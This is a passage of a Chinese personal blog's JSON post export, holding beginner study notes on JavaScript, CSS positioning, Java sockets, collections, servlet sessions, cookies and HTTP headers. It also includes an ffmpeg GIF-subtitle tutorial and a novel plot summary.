mvc/","link":"","permalink":"http://yoursite.com/2018/05/13/javaee%20mvc/","excerpt":"","text":"具体包内的信息","categories":[],"tags":[]},{"title":"梦幻花-东野圭吾读书笔记","slug":"梦幻花-东野圭吾读书笔记","date":"2018-04-28T06:27:13.000Z","updated":"2020-11-14T17:11:31.197Z","comments":true,"path":"2018/04/28/梦幻花-东野圭吾读书笔记/","link":"","permalink":"http://yoursite.com/2018/04/28/%E6%A2%A6%E5%B9%BB%E8%8A%B1-%E4%B8%9C%E9%87%8E%E5%9C%AD%E5%90%BE%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/","excerpt":"","text":"梦幻花（黄色牵牛花）：在很久以前出现，吸食者会有致幻作用，（类似毒品），当时日本官方，命令人清除所有牵牛花。后来，警方（蒲生祖辈）和医生（依庭祖辈）发现，黄色牵牛花可以让嫌犯说真话，不料黄色牵牛花散落人间，被民间（田中和道）获得。女星因为抑郁去世，田中和道作为他的终极粉丝，得知后整日伤心，并服用黄色牵牛花种子，在女星去世的下一个月的那天，吸食过多，发疯拿武士刀到大街上将真一，和子杀死，这个事件为MM事件。田中和道死后，种子被他的父亲工藤带回了老家。真一和和子的女儿志摩子，被亲戚养大。蒲生真嗣有一个儿子要介，娶了志摩子作为二房太太，是为了补偿志摩子家族。后来生下苍太。蒲生的大家族中，就苍太不知道牵牛花这件事，是真嗣不希望下一辈知道这些。对其有所隐瞒。蒲生家族，因为为了寻找黄色牵牛花，一直会有每年定期去看牵牛花的花会，苍太很反感，一次因为脚疼，做到花会中间休息的地方，偶遇依庭的后人孝美。苍太和孝美一见钟情。交往一段时间后，真嗣发现这件事，很反对。当时，依庭家族和蒲生家族会互相交换秘密，也就知道了他们两的恋情，孝美决定不见苍太。尚人，一个音乐家。他有个妹妹，梨乃，是一个游泳好手，尚人一直活在梨乃的光辉下。尚人和同学雅哉创建社团，后来雅哉一次偶遇工藤，工藤告诉雅哉可以服用种子获得灵感，但是不能服用太多。雅哉用过后，又让尚人服用，创造出不少作品。尚人将种子给自己爷爷秋山周治，希望能大量繁殖种子。尚人因为服用，过多，跳楼自杀。雅哉怕事情败露，遂去寻秋山周治，结果秋山周治竟然当场要报警，于是雅哉杀害了秋山周治。后来就是梨乃，苍太，要介，孝美，早濑寻找杀人凶手的过程了。","categories":[],"tags":[{"name":"东野圭吾","slug":"东野圭吾","permalink":"http://yoursite.com/tags/%E4%B8%9C%E9%87%8E%E5%9C%AD%E5%90%BE/"}]},{"title":"javascript","slug":"javascript","date":"2018-04-27T11:26:16.000Z","updated":"2020-11-14T17:11:31.779Z","comments":true,"path":"2018/04/27/javascript/","link":"","permalink":"http://yoursite.com/2018/04/27/javascript/","excerpt":"","text":"*prototype *prototype 属性使您有能力向对象添加属性和方法 var array = [&apos;banner&apos;,&apos;apple&apos;,&apos;orange&apos;]; Array.prototype.myUpcase = function(){ for (var i = this.length - 1; i &gt;= 0; i--) { this[i] = this[i].toUpperCase(); } }; array.myUpcase(); console.log(array);// [&quot;BANNER&quot;, &quot;APPLE&quot;, &quot;ORANGE&quot;]在构建一个方法时，所有的数组都可以使用该方法Array.prototype 单独不能引用数组, Array() 对象可以。 *forEach() *array.forEach(function(currentValue, index, arr), thisValue)currentValue：当前值，必须index：currentValue对应的index，可选arr：操作的这个array这个数组，可选 var array = [3,2,3,4,5]; array.forEach(fn); function fn(item,index,arr){ console.log(&quot;array[&quot;+index+&quot;] : &quot;+item); }; /* array.forEach(function(item,index,arr{ console.log(&quot;array[&quot;+index+&quot;] : &quot;+item); });//也可以写成这样，感觉java和js函数的参数很不一样 */ Date（）对象 var date = new Date(); var timeStr = date.getFullYear()+&quot; : &quot;+date.getHours()+&quot; : &quot;+date.getMinutes(); console.log(timeStr);//2018 : 19 : 2*regex *修饰符 i：对大小不敏感的匹配 g：执行全局匹配，（不是执行一次匹配后停止） m：执行多行匹配/i var str = &quot;Visist RUnoob&quot;; var patt1 = /runoob/i; console.log(str.match(patt1));//&quot;RUnoob&quot;/g var str=&quot;Is this all there is?&quot;; var patt1=/is/g; alert(str.match(patt1));//is,is patt1 = /is/; alert(str.match(patt1));//is","categories":[],"tags":[{"name":"实训","slug":"实训","permalink":"http://yoursite.com/tags/%E5%AE%9E%E8%AE%AD/"},{"name":"js","slug":"js","permalink":"http://yoursite.com/tags/js/"}]},{"title":"css position","slug":"css position","date":"2018-04-26T14:15:45.000Z","updated":"2020-11-14T17:11:32.277Z","comments":true,"path":"2018/04/26/css position/","link":"","permalink":"http://yoursite.com/2018/04/26/css%20position/","excerpt":"","text":"/** static relative 相对布局 相对的是自己原来所在的位置 依然占有自己原来的位置 absolute 绝度布局 会脱离文档流 当父元素进行了定位时，相对的是父元素的位置 若父元素没有进行定位，相对的是body元素 fixed 固定布局 会脱离文档流 相对于窗口进行定位 */ 下面主要研究absolute &lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; .father{ width: 300px; height:200px; background-color: blue; /*position: relative;*/ } .son{ width: 100%; height: 100%; position: absolute; background-color: red; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;father&quot;&gt; &lt;div class = &quot;son&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;可以发现，这个classson，在father下面，son的position为absolute，但是father没有写，所以，son的width：100%，height：100%会布满整个body。但是，将father里面的position改为relative，son的width：100%，height：100%就会只布满father这个width：300px，height：200px；","categories":[],"tags":[]},{"title":"java 简单socket通信","slug":"java 简单socket通信","date":"2018-04-19T11:15:26.000Z","updated":"2020-11-14T17:11:32.749Z","comments":true,"path":"2018/04/19/java 简单socket通信/","link":"","permalink":"http://yoursite.com/2018/04/19/java%20%E7%AE%80%E5%8D%95socket%E9%80%9A%E4%BF%A1/","excerpt":"","text":"TCPServer ServerSocket ss = new ServerSocket(port);//创建以server运行的机器的locahost：port的服务器 /** 通过ss.accept(),阻塞式接收连接到服务器的socket，并创建一个线程来监听这个socket */ while(true){ Socket s = ss.accept(); new Thread(new ServerTask(s)).start(); }ServerTask：调用Runable接口, public Class ServerTask implements Runable{ private Socket s; public ServerTask(Socket s){//将监听的socket赋给s this.s = s; } @Override public void run() {//监听socket的输入输出流 InputStream is = s.getInputStream();//socket-&gt;server OutputStream os = s.getOutputStream();//server -&gt;socket Scanner sc = null; PrinterWriter pw = null; try { sc = new Scanner(is); pw = new PrinterWriter(os); } catch (IOException e) { e.printStackTrace(); } while(true) { String data = sc.nextLine();//阻塞式监听，是否接收到socket发来数据 System.out.println(data); pw.println(&quot;xxxxxx&quot;);//接收到data后，再返回信息xxxxx给socket pw.flush(); } } }client public class Client { public static void main(String[] args) throws IOException{ Socket s = new Socket(&quot;127.0.0.1&quot;,8888);//创建socket，连接服务器，127.0.0.1:8888 new Thread(new WriteTask(s)).start();//创建线程对socket的写数据流监听 socket-》server new Thread(new ReadTask(s)).start();//创建线程对socket的读数据流监听 server - 》socket }WriteTask public class WriteTask implements Runnable { private Socket s; public WriteTask(Socket s){ this.s = s; } @Override public void run() { PrintWriter printWriter = null; try { printWriter = new PrintWriter(s.getOutputStream()); } catch (IOException e) { e.printStackTrace(); } Scanner sc = new Scanner(System.in); while(true){//阻塞式判断终端是否有输入 String message = sc.nextLine(); printWriter.println(message);//socket-&gt;server printWriter.flush(); } }ReadTask InputStream is = s.getInputStream(); Scanner sc = new Scanner(is); while(true){//阻塞式判断是否有输入 String message = sc.nextLine();//Server-&gt;socket System.out.println(message); } 总结：1.服务器whiletrue，阻塞接收socket，接到后，对socket专门创建线程进行监听，然后对socket接收请求，根据请求，服务器返回response2.client 创建socket 1.client写数据，对server发送request，2.创建线程，对服务器的reponse进行接收3.PrinterWriter是对outputStream的封装，Scanner是对inputStream封装，只是很方便文字传输，但是要是传输图片或者object时 …….就会报错，所以，选择合适的流是很重要的4.我上述的代码是简要版","categories":[],"tags":[{"name":"实训","slug":"实训","permalink":"http://yoursite.com/tags/%E5%AE%9E%E8%AE%AD/"}]},{"title":"TreeSet和HashSet 去除重复数据的不同","slug":"TreeSet和HashSet 去除重复数据的不同","date":"2018-03-27T10:42:57.000Z","updated":"2020-11-14T17:11:33.249Z","comments":true,"path":"2018/03/27/TreeSet和HashSet 去除重复数据的不同/","link":"","permalink":"http://yoursite.com/2018/03/27/TreeSet%E5%92%8CHashSet%20%E5%8E%BB%E9%99%A4%E9%87%8D%E5%A4%8D%E6%95%B0%E6%8D%AE%E7%9A%84%E4%B8%8D%E5%90%8C/","excerpt":"","text":"TreeSet去重首先TreeSet可以实现排序 @org.junit.Test public void testHashSet() { Person person = new Person(&quot;1&quot;,1,1); Person person1 = new Person(&quot;1&quot;,1,2); Person person2 = new Person(&quot;2&quot;,1,2); TreeSet&lt;Person&gt; treeSet = new TreeSet&lt;&gt;(new Comparator&lt;Person&gt;() { @Override public int compare(Person o1, Person o2) { if(o1.getName().equals(o2.getName())){ return 0; } if(o1.getAge() &gt; o2.getAge()){ return 1; }else { return -1; } } }); } /** public Person(String name, int age,int money) { this.name = name; this.age = age; this.money = money; } 这是Person类的构造器 */在treeSet创建的时候，重写了以下代码1. TreeSet&lt;Person&gt; treeSet = new TreeSet&lt;&gt;(new Comparator&lt;Person&gt;() { @Override public int compare(Person o1, Person o2) { return 0;//Person o1留下，o2添加失败 return -1;//倒序存储 return 1;//升序存储 } });这个方法中，return 0；是无法添加的2.当然也可以在Person类中实现comparable接口，重写接口中的compareTo方法，具体实现和上面的方法没有太大区别 HashSetHashSet是通过HashMap实现的，hashCode（）和equals()是HashMap用的, 因为无需排序所以只需要关注定位和唯一性即可修改Person类中的hashCode（）和equals（）方法，两个都要修改","categories":[],"tags":[{"name":"实训","slug":"实训","permalink":"http://yoursite.com/tags/%E5%AE%9E%E8%AE%AD/"}]},{"title":"为所欲为gif制作","slug":"为所欲为gif制作","date":"2018-03-20T08:42:29.000Z","updated":"2020-11-14T17:11:33.781Z","comments":true,"path":"2018/03/20/为所欲为gif制作/","link":"","permalink":"http://yoursite.com/2018/03/20/%E4%B8%BA%E6%89%80%E6%AC%B2%E4%B8%BAgif%E5%88%B6%E4%BD%9C/","excerpt":"","text":"具体原理不知，而且代码写的很拙劣，只是玩一玩本博客是模仿以上大佬的代码 综合版，ubuntu+ruby 其实我是看另一个大佬的代码 ubuntu+python版 只是实现了gif制作 step1：如何为视频加字幕 Aegisub字幕教学 step2：研究Aegisub的字幕.ass文件 [Script Info] ; Script generated by Aegisub 3.2.2 ; http://www.aegisub.org/ Title: Default Aegisub file ScriptType: v4.00+ WrapStyle: 0 ScaledBorderAndShadow: yes YCbCr Matrix: None [Aegisub Project Garbage] Audio File: C:/Users/Administrator/Desktop/sorrypy-master/static/sorry/template.mp4 Video File: C:/Users/Administrator/Desktop/sorrypy-master/static/sorry/template.mp4 Video AR Mode: 4 Video AR Value: 1.781250 Active Line: 8 Video Position: 411 [V4+ Styles] Format: Name, Fontname, Fontsize, PrimaryColour, SecondaryColour, OutlineColour, BackColour, Bold, Italic, Underline, StrikeOut, ScaleX, ScaleY, Spacing, Angle, BorderStyle, Outline, Shadow, Alignment, MarginL, MarginR, MarginV, Encoding Style: Default,Arial,20,&amp;H00FFFFFF,&amp;H000000FF,&amp;H00000000,&amp;H00000000,0,0,0,0,100,100,0,0,1,2,2,2,10,10,10,1 [Events] Format: Layer, Start, End, Style, Name, MarginL, MarginR, MarginV, Effect, Text Dialogue: 0,0:00:00.00,0:00:06.87,Default,,0,0,0,,好，别说我是移除联盟的 Dialogue: 0,0:00:05.00,0:00:07.02,Default,,0,0,0,,就算你想诬告我 Dialogue: 0,0:00:07.02,0:00:09.62,Default,,0,0,0,,我有的是钱让律师帮我打官司 Dialogue: 0,0:00:09.62,0:00:11.22,Default,,0,0,0,,我想我根本不用坐牢 Dialogue: 0,0:00:11.22,0:00:12.72,Default,,0,0,0,,你别以为有钱了不起啊 Dialogue: 0,0:00:12.72,0:00:15.62,Default,,0,0,0,,sorry，有钱真的了不起 Dialogue: 0,0:00:15.62,0:00:19.62,Default,,0,0,0,,不过我想你不会明白这种感觉 Dialogue: 0,0:00:19.62,0:00:21.62,Default,,0,0,0,,不明白 Dialogue: 0,0:00:21.62,0:00:23.62,Default,,0,0,0,,在最下面是字幕的startTime和endTime，最后面是字幕内容step3：如何制作属于自己的gif，当然要用到 ffmepg 具体原理我也不知道 首先下载ffmepg sudo add-apt-repository ppa:kirillshkrogalev/ffmpeg-next sudo apt-get update sudo apt-get install ffmpeg安装好后终端中运行下面这句话，大概是意思将视频附加字幕转换成gif运行这句话，需要有以下元素input.mp4,text2.ass ffmpeg -i input.mp4 -r 8 -vf ass=text2.ass,scale=300:-1 -y sorry.gifinput.mp4是刚刚的为所欲为的视频，text2.ass就是一个小重点了，因为我们要修改他的内部字幕step4： 修改字幕首先，你要自己做一个字幕，得到视频中每一句话的startTime和endTime，这样才能对的上嘴型，让人看gif不至于太假 #coding:utf-8 # # import re # oldFile = open(&quot;sorry.ass&quot;,&quot;r&quot;) # # context = oldFile.read() # # print context # # print &apos;finish&apos; # # print &quot;\\n\\n&quot; # # newContext = re.sub(r&apos;0,,(.*?)\\n&apos;,&apos;0,,{sentence}\\n&apos;,context) # newFile = open(&quot;test.ass&quot;,&apos;w&apos;) # newFile.write(newContext) # newFile.close() # 以上是将数据替换成{sentence} # file = open(&apos;test.ass&apos;,&apos;rb&apos;) # file2 = open(&apos;text2.ass&apos;,&apos;w&apos;) # lines = file.readlines() # sentences = [&apos;1&apos;,&apos;2&apos;,&apos;3&apos;,&apos;4&apos;,&apos;5&apos;,&apos;6&apos;,&apos;7&apos;,&apos;8&apos;,&apos;9&apos;] # i = 0 # for line in lines: # if &apos;{sentence}&apos; in line: # line = line.replace(&apos;{sentence}&apos;,sentences[i]) # i += 1 # print line # file2.write(line) #以上实现的将sentence换成对应的字幕原理：将自己得到的sorry.ass进行正则匹配，将字幕内容都用{sentence}替换，然后再通过，将想改的字幕依次填入sentences这个list，最后遍历再将{sentence}替换掉。 最后这代码可以不看 from subprocess import Popen,PIPE ass_path = &#39;text2.ass&#39; gif_path = &#39;sorry.gif&#39; video_path = &#39;input.mp4&#39; cmd = &quot;ffmpeg -i {video_path} -r 8 -vf ass={ass_path},scale=300:-1 -y {gif_path}&quot; \\ .format(video_path=video_path, ass_path=ass_path, gif_path=gif_path) print(cmd) p = Popen(cmd,shell=True,stdout=PIPE,stderr=PIPE) p.wait() if p.returncode==-1: print(&quot;error&quot;) *具体源代码 https://github.com/pompeii666/mp4ToGif *","categories":[],"tags":[{"name":"生活","slug":"生活","permalink":"http://yoursite.com/tags/%E7%94%9F%E6%B4%BB/"},{"name":"python","slug":"python","permalink":"http://yoursite.com/tags/python/"},{"name":"搞笑","slug":"搞笑","permalink":"http://yoursite.com/tags/%E6%90%9E%E7%AC%91/"}]},{"title":"HttpSession","slug":"HttpSession","date":"2017-12-14T07:33:50.000Z","updated":"2020-11-14T17:11:34.244Z","comments":true,"path":"2017/12/14/HttpSession/","link":"","permalink":"http://yoursite.com/2017/12/14/HttpSession/","excerpt":"","text":"HttpSession类 /** 1）创建或得到session HttpSession getSession() HttpSession getSession(boolean create) 2)设置session对象 void setMaxInactiveInterval(int interval):设置session的有效时间 void invalidate():销毁session对象 java.lang.String getId() :得到session编号 3）保存会话数据到session对象 void setAttribute(java.lang.String name,java.lang.Object value):保存数据 java.lang.Object getAttribute(java.lang.String name):获取数据 void removeAttribute(java.lang.String name):清除数据 */ Session原理 /** 问题：服务器能够识别不同的浏览者 代码解读：HttpSession seesion = request.getSession(); 1）第一次访问创建session对象，给session对象分配一个唯一的id，叫JSESSIONID newHttpSession() 2)把JSESSIONID作为Cookie的值发送给浏览器保存 Cookie cookie = new Cookie(&quot;JSESSIONID&quot;,sessionID); response.addCookie(cookie); 3)第二次访问的时候，浏览器带着JESSIONID的cookie访问服务器 4)服务器得到JSESSIONID，在服务器的内存中搜索是否存放对应编号的session对象。 if(找到){ return map.get(sessionID); } Map&lt;String,HttpSession&gt; 5)如果找到对应编号的session对象，直接返回该对象 6）如果找不到对应编号的session对象，创建新的session对象，继续走1的流程 结论：通过JSEESIONID的cookie值在服务器找session对象！！！！ */Session细节 1)java.lang.String getId() :得到session编号 2）两个getSession方法： getSession(true)/getSession() : 创建或得到session对象。没有匹配的session编号，创建新的session对象。 3)void setMaxInactiveInterval(int interval):设置session的有效时间 session对象销毁时间： 3.1默认情况30分服务器自动回收 3.2修改session回收时间 3.3全局修改session有效时间 &lt;!--修改session全局有效时间：分钟--&gt; &lt;session-config&gt; &lt;session-timeout&gt;1&lt;/session-timeout&gt; &lt;/session-config&gt; 3.4手动销毁session对象 void invalidate() :销毁session对象 4）如何避免浏览器的JSESSIONID的cookie随着浏览器关闭而丢失的问题 Cookie c = new Cookie(&quot;JSESSIONID&quot;,session.getID()); c.setMaxAge(60*60); response.addCookie(c);","categories":[],"tags":[{"name":"session","slug":"session","permalink":"http://yoursite.com/tags/session/"}]},{"title":"cookie","slug":"cookie","date":"2017-12-08T02:39:23.000Z","updated":"2020-11-14T17:11:34.771Z","comments":true,"path":"2017/12/08/cookie/","link":"","permalink":"http://yoursite.com/2017/12/08/cookie/","excerpt":"","text":"会话技术Cookie技术：会话数据保存在浏览器客户端Session技术：会话数据保存在服务器端 Cookie类：用于存储会话数据1）构造Cookie对象Cookie(java.lang.String name,java.lang.String value)2)设置cookievoid setPath（java.lang.String uri）:设置cookie的有效访问路径void setMaxAge(int expiry)：设置cookie的有效时间void setValue（java.lang.String newValue newValue）:设置cookie的值3）发送cookie到浏览器保存void response.addCookie(Cookie cookie):发送cookie4）服务接收cookieCookie[] request.getCookies():接收cookie 3.3Cookie原理1）服务器创建cookie对象，把会话数据存储到cookie对象中new Cookie(“name”,”value”);2）服务器发送cookie信息到浏览器response.add(cookie);举例：set-cookie：name=eric（隐藏发送了一个set-cookie名称的响应头）3)浏览器得到服务器发送的cookie，然后保存在浏览器端4）浏览器在下次访问服务器时，会带着cookie信息举例：cookie：name=eric（隐藏带着一个叫cookie名称的请求头）5）服务器接收到来自浏览器带来的cookie信息request.getCookies(); 3.4Cookie的细节1）void setPath(java.lang.Stringuri):设置cookie的有效访问路径。有效路径指的是cookie的有效路径保存在哪里，那么浏览器在有效路径下访问就会带着cookie信息，否则不带cookie信息2）void setMaxAge(int expiry):设置cookie的有效时间正整数：表示cookie数据保存在浏览器的缓存目录中（硬盘），数值表示保存时间（秒为单位）负整数：关闭浏览器cookie丢失零：表示删除同名的cookie数据3）cookie数据类型只能保存非中文字符串类型的。可以保存多个cookie，但是浏览器一般只允许存放300个cookie，每个站点最多存放20个cookie，每个cookie的大小限制4kb。而且不可以出现ascii（44,32）的字符，也就是空格和逗号 ,","categories":[],"tags":[]},{"title":"web应用中路径问题以及读取web应用下资源文件","slug":"web应用中路径问题以及读取web应用下资源文件","date":"2017-12-08T02:13:03.000Z","updated":"2020-11-14T17:11:35.318Z","comments":true,"path":"2017/12/08/web应用中路径问题以及读取web应用下资源文件/","link":"","permalink":"http://yoursite.com/2017/12/08/web%E5%BA%94%E7%94%A8%E4%B8%AD%E8%B7%AF%E5%BE%84%E9%97%AE%E9%A2%98%E4%BB%A5%E5%8F%8A%E8%AF%BB%E5%8F%96web%E5%BA%94%E7%94%A8%E4%B8%8B%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6/","excerpt":"","text":"*web应用中路径问题 * /** 目标资源：target.html 思考：目标资源是给谁用的 给服务器使用的：/表示在当前web应用的根目录 给浏览器使用的：/表示在webapps的根目录下 */代码片 public class PathDemo extends HttpServlet { public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { response.setContentType(&quot;text/html;charset=utf-8&quot;); //目标资源： target.html /** * 思考： 目标资源是给谁使用的。 * 给服务器使用的： / 表示在当前web应用的根目录（webRoot下） * 给浏览器使用的： / 表示在webapps的根目录下 */ /** * 1.转发 */ //request.getRequestDispatcher(&quot;/target.html&quot;).forward(request, response); /** * 2.请求重定向 */ //response.sendRedirect(&quot;/day11/target.html&quot;); /** * 3.html页面的超连接href */ response.getWriter().write(&quot;&lt;html&gt;&lt;body&gt;&lt;a href=&apos;/day11/target.html&apos;&gt;超链接&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;&quot;); /** * 4.html页面中的form提交地址 */ response.getWriter().write(&quot;&lt;html&gt;&lt;body&gt;&lt;form action=&apos;/day11/target.html&apos;&gt;&lt;input type=&apos;submit&apos;/&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&quot;); } }转发和请求重定向的区别 /** 1）转发 a)地址栏不会改变 b)转发只能转到当前web应用内的资源 c)可以在转发过程中，可以把数据保存到request 2)请求重定向 a)地址栏会改变，变成重定向的地址 b)重定向可以跳转到当前web应用，也可以是其他web应用，也可以是外部域名网站 c）不能在重定向的过程，把数据保存到request中 //结论：如果要使用request域对象进行数据共享，只能用转发技术 */读取web应用下的资源文件 /** 读取文件。在web项目下不要这样读取。因为.表示在tomcat/bin目录下 File file = new File(&quot;./src/db.properties&quot;); FileInputStream in = new FileInputStream(file); */ //使用web应用下加载资源文件的方法 /** 1.getRealPath读取，返回资源文件的绝对路径 */ /** String path = this.getServletContext().getRealPath(&quot;/WEB-INF/classes/db.properties&quot;); File file = new File(path); FileInputStream in = new FileInputStream(file); */ /** 2.getResourceAsStream()得到资源文件，返回的是输入流 */ InputStream in = this.getServletContext().getResourceAsStream(&quot;/WEB-INF/classes/db.properties&quot;); Properties prop = new Properties(); //读取资源文件 prop.load(in); String user = prop.getProperty(&quot;user&quot;); String password = prop.getProperty(&quot;password&quot;); System.out.println(&quot;user:&quot;+user+&quot;password:&quot;+password);","categories":[],"tags":[]},{"title":"http协议-response","slug":"http协议-response","date":"2017-11-27T12:36:40.000Z","updated":"2020-11-14T17:11:35.789Z","comments":true,"path":"2017/11/27/http协议-response/","link":"","permalink":"http://yoursite.com/2017/11/27/http%E5%8D%8F%E8%AE%AE-response/","excerpt":"","text":"HTTP/1.1 200 OK --响应行 Server: Apache-Coyote/1.1 --响应头（key-vaule） Content-Length: 24 Date: Fri, 30 Jan 2015 01:54:57 GMT --一个空行 this is hello servlet!!! --实体内容 状态码 200 请求已成功，请求所希望的响应头或数据体将随此响应返回。 302 请求重定向 404 客户访问的资源找不到 500 表示服务器的资源发送错误（服务器内部错误）常见的响应头 Location: http://www.it315.org/index.jsp -表示重定向的地址，该头和302的状态码一起使用。 Server:apache tomcat ---表示服务器的类型 Content-Encoding: gzip -- 表示服务器发送给浏览器的数据压缩类型 Content-Length: 80 --表示服务器发送给浏览器的数据长度 Content-Language: zh-cn --表示服务器支持的语言 Content-Type: text/html; charset=GB2312 --表示服务器发送给浏览器的数据类型及内容编码 Last-Modified: Tue, 11 Jul 2000 18:23:51 GMT --表示服务器资源的最后修改时间 Refresh: 1;url=http://www.it315.org --表示定时刷新 Content-Disposition: attachment; filename=aaa.zip --表示告诉浏览器以下载方式打开资源（下载文件时用到） Transfer-Encoding: chunked Set-Cookie:SS=Q0=5Lb_nQ; path=/search --表示服务器发送给浏览器的cookie信息（会话管理用到） Expires: -1 --表示通知浏览器不进行缓存 Cache-Control: no-cache Pragma: no-cache Connection: close/Keep-Alive --表示服务器和浏览器的连接状态。close：关闭连接 keep-alive:保存连接HttpServletResponse对象 响应行： response.setStatus() 设置状态码 响应头： response.setHeader(&quot;name&quot;,&quot;value&quot;); 实体内容：（客户可以看见的） response.getWriter().writer();//发送字符实体内容 protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { /** * 3）通过response对象改变响应信息 * */ /** * 3.1响应行 * * */ //修改状态码 //response.setStatus(404);//修改状态码 //response.sendError(404);//发送状态码还有错误页面 /** * 3.2响应头 * */ response.setHeader(&quot;server&quot;,&quot;JBoss&quot;); /** * 3.3实体内容（浏览器直接可以看到的内容） * */ response.getWriter().write(&quot;01.hello world&quot;); }请求重定向 @WebServlet(name = &quot;ResponseDemo2&quot;,urlPatterns = &quot;/ResponseDemo2&quot;) public class ResponseDemo2 extends HttpServlet { /** * 需求：跳转到adv。html * 使用请求重定向：发送一个302状态码+location的响应头 * * */ /** * 请求重定向浏览器一共想服务器发送两次请求，第一次是ResponseDemo1，第二次是adv。html * 服务器也是返回两次，第一次是status302，location。adv.html,第二次是adv。html * */ protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { // response.setStatus(302); // response.setHeader(&quot;location&quot;,&quot;/some/adv.html&quot;); //请求重定向简化写法 response.sendRedirect(&quot;/some/adv.html&quot;); } }定时刷新和隔n秒跳转到另外页面 //定时刷新 response.setHeader(&quot;refresh&quot;,&quot;1&quot;); /** 隔n秒跳转到其他页面 */ response.setHeader(&quot;refresh&quot;,&quot;3;url=/some/adv.html&quot;)//隔三秒，跳转到adv.htmlcontent-Type作用 @WebServlet(name = &quot;ResponseDemo4&quot;,urlPatterns = &quot;/ResponseDemo4&quot;) public class ResponseDemo4 extends HttpServlet { protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { /** *1.服务器发送给浏览器的数据类型 * */ response.setContentType(&quot;text/html;charset=utf-8&quot;); // response.setContentType(&quot;text/html&quot;); //设置响应实体内容编码 // response.setCharacterEncoding(&quot;utf-8&quot;); //response.setHeader(&quot;content-type&quot;,&quot;text/html&quot;);//和上面的代码等价 //response.setContentType(&quot;text/xml&quot;); response.getWriter().write(&quot;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;中国&lt;/body&gt;&lt;/html&gt;&quot;); //File file = new File(&quot;e:gakki.jpg&quot;); /** * 设置以下载方式打开文件 * * */ //response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename&quot; + file.getName()); /** * 下载图片 * */ /** * 发送图片 * */ // response.setContentType(&quot;image/jpg&quot;); // FileInputStream in = new FileInputStream(file); // byte[] buf = new byte[1024]; // int len = 0; // //把图片写到浏览器 // while((len = in.read(buf))!=-1){ // response.getOutputStream().write(buf,0,len); // } // } } }完美解决项目编码问题 /** 在每个servlet开头写： */ request.setCharacterEncoding(&quot;utf-8&quot;); response.setContentType(&quot;text/html;charset=utf-8&quot;);","categories":[],"tags":[]},{"title":"http协议-request","slug":"http协议-request","date":"2017-11-21T12:54:54.000Z","updated":"2020-11-14T17:11:36.276Z","comments":true,"path":"2017/11/21/http协议-request/","link":"","permalink":"http://yoursite.com/2017/11/21/http%E5%8D%8F%E8%AE%AE-request/","excerpt":"","text":"http协议内容 请求（浏览器-》服务器） Request GET /day09/hello HTTP/1.1--请求行 Host: localhost:8080---请求头（多个key-value对象） User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-cn,en-us;q=0.8,zh;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive ---一个空行 name=husky&amp;password=adios ----(可选)实体内容（只有post提交的参数会放到实体内容中）） 响应（服务器-》浏览器）Response HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Length: 24 Date: Fri, 30 Jan 2015 01:54:57 GMT this is hello servlet!!!http协议版本 http1.0: 当前浏览器客户端与服务器建立连接后，只能发送一次请求， 一次请求之后连接关闭 http1.1:当前浏览器客户端和服务器建立连接之后，可以在一次连接中发送多次请求。（基本上都使用1.1版本）请求方式 常见请求方式：GET和POST 1）GET方式提交 a)地址栏（url）会跟上参数数据。以？开头，多个参数以&amp;分割 GET /day09/testMethod.html?name=eric&amp;password=123456 HTTP/1.1 b)GET提交参数数据有限制，不超过1kb c)GET方式不适合提交敏感密码。 d)注意：浏览器直接访问的请求，默认提交方式是GET方式。 2）POST方式提交 a)参数不会跟在URI后面。参数而是跟在请求的实体内容中。没有？开头，而是以&amp;连接 name=eric&amp;password=123456 b)post提交的参数数据没有限制。 c)post方式提交铭感数据请求头 Accept: text/html,image/* -- 浏览器接受的数据类型 Accept-Charset: ISO-8859-1 -- 浏览器接受的编码格式 Accept-Encoding: gzip,compress --浏览器接受的数据压缩格式 Accept-Language: en-us,zh- --浏览器接受的语言 Host: www.it315.org:80 --（必须的）当前请求访问的目标地址（主机:端口） If-Modified-Since: Tue, 11 Jul 2000 18:23:51 GMT --浏览器最后的缓存时间 Referer: http://www.it315.org/index.jsp -- 当前请求来自于哪里 User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0) --浏览器类型 Cookie:name=eric -- 浏览器保存的cookie信息 Connection: close/Keep-Alive -- 浏览器跟服务器连接状态。close: 连接关闭 keep-alive：保存连接。 Date: Tue, 11 Jul 2000 18:23:51 GMT -- 请求发出的时间通过servlet获得浏览器发过来的请求数据RequestDemo2.java package com.husky.javaweb; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.InputStream; import java.util.Enumeration; @WebServlet(name = &quot;RequestDemo2&quot;,urlPatterns = &quot;/RequestDemo2&quot;) public class RequestDemo2 extends HttpServlet { //为了接收POST方式提交的请求 protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { t3(request); } /** * 1)tomcat服务器接受到浏览器发送的请求数据，然后封装到HttpServletRequest对象中 * 2）tomcat服务器调用doGet方法，然后把request对象传入到servlet中。 * * */ protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { /** * 3）从request对象取出请求数据 * */ /** * 3.1请求行 格式：（GET /hello http1.1） * 